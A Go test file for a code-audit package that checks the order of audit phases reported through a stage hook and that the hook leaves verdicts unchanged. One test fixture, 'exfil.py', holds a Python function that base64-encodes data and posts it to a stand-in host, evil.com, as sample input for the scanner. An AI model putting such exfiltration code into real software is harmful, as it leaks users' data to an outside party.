package codeaudit

import (
	"context"
	"reflect"
	"testing"
)

// TestGenerateAuditReportReportsPhasesInOrder pins the phase sequence a caller
// observes through OnStage. The order is the contract the platform mock's flow
// diagram draws, so it must not drift with the implementation.
func TestGenerateAuditReportReportsPhasesInOrder(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "exfil.py", `
import requests
import base64

def steal_data(data):
    encoded = base64.b64encode(data)
    requests.post("http://evil.com/collect", json={"payload": encoded.decode()})
`)

	var stages []string
	cfg := AuditConfig{
		LLM:    LLMConfig{Enabled: false},
		Binary: DefaultBinaryConfig(),
		OnStage: func(stage string) {
			stages = append(stages, stage)
		},
	}
	if _, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(), cfg, nil); err != nil {
		t.Fatalf("GenerateAuditReport: %v", err)
	}

	want := []string{StageStatic, StageBinary, StageAI, StageConclude}
	if !reflect.DeepEqual(stages, want) {
		t.Fatalf("stages = %v, want %v", stages, want)
	}
}

// TestGenerateAuditReportStageHookIsObservational checks the two guarantees the
// hook makes to existing callers: a nil hook works, and a present hook does not
// change the verdict.
func TestGenerateAuditReportStageHookIsObservational(t *testing.T) {
	dir := t.TempDir()
	writeTestFile(t, dir, "train.py", `
import torch
import torch.nn as nn

class Model(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 2)
    def forward(self, x):
        return self.fc(x)
`)

	baseline, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(),
		AuditConfig{LLM: LLMConfig{Enabled: false}}, nil)
	if err != nil {
		t.Fatalf("baseline audit: %v", err)
	}

	observed := 0
	withHook, err := GenerateAuditReport(context.Background(), dir, DefaultEngine(),
		AuditConfig{
			LLM:     LLMConfig{Enabled: false},
			OnStage: func(string) { observed++ },
		}, nil)
	if err != nil {
		t.Fatalf("hooked audit: %v", err)
	}
	if observed != 4 {
		t.Fatalf("hook calls = %d, want 4", observed)
	}
	if !reflect.DeepEqual(baseline.Conclusion, withHook.Conclusion) {
		t.Fatalf("conclusion changed with a hook:\n nil: %+v\nhook: %+v",
			baseline.Conclusion, withHook.Conclusion)
	}
	if len(baseline.FileReports) != len(withHook.FileReports) {
		t.Fatalf("file reports changed with a hook: %d vs %d",
			len(baseline.FileReports), len(withHook.FileReports))
	}
}

// TestGenerateAuditReportStageHookSkipsEarlyFailures keeps the hook silent when
// the audit never starts, so a caller cannot paint a phase that did not run.
func TestGenerateAuditReportStageHookSkipsEarlyFailures(t *testing.T) {
	var stages []string
	hook := func(stage string) { stages = append(stages, stage) }

	if _, err := GenerateAuditReport(context.Background(), "", DefaultEngine(),
		AuditConfig{OnStage: hook}, nil); err == nil {
		t.Fatal("empty dir should fail")
	}
	if _, err := GenerateAuditReport(context.Background(), t.TempDir(), nil,
		AuditConfig{OnStage: hook}, nil); err == nil {
		t.Fatal("nil engine should fail")
	}
	if len(stages) != 0 {
		t.Fatalf("stages = %v, want none", stages)
	}
}
